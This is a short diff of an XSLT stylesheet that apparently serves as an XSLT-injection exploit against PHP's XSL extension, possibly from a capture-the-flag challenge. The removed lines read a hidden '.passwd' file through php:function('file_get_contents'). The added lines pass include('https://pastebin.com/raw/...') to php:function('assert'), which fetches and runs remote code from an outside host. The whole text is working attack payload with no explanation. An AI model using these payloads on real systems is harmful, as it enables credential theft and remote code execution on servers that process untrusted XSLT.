@@ -1,7 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
-    <xsl:output method="html"/>
-    <xsl:template match="/">
-      <xsl:value-of select="php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')"/><br/>
-    </xsl:template>
-</xsl:stylesheet>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+		<xsl:variable name="payload">
+			include("https://pastebin.com/raw/WaYSuqap")
+		</xsl:variable>
+		<xsl:variable name="include" select="php:function('assert',$payload)"/>
+</body>
+</html>
